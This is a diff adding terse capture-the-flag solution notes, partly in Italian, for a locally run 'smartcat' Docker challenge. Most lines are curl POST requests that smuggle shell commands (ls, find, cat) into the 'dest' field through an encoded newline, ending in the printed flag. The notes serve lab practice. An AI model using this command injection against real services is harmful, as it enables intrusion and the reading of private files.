@@ -1,0 +1,14 @@
+1. cd "/c/Users/Andre/Documents/smartcat1"
+2. chmod -R +rx ./
+3. Build: docker build -t cpp/smartcat .
+4. Run: docker run -d -p 127.0.0.1:8092:5000 --name ocr cpp/smartcat
+5. apri http://127.0.0.1:8092
+6. curl "http://127.0.0.1:8092" -X POST --data "dest=127.0.0.1"
+7. curl "http://127.0.0.1:8092" -X POST --data "dest=127.0.0.10%0als" (notiamo there e index.py)
+8. //si può anche saltare
+curl "http://127.0.0.1:8092" -X POST --data "dest=127.0.0.10%0als there" (notiamo is)
+9. curl "http://127.0.0.1:8092" -X POST --data "dest=127.0.0.10%0afind"
+10. curl "http://127.0.0.1:8092" -X POST --data "dest=127.0.0.10%0acat<there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag"
+11. risultato: INS{warm_kitty_smelly_kitty_flush_flush_flush}
+
+
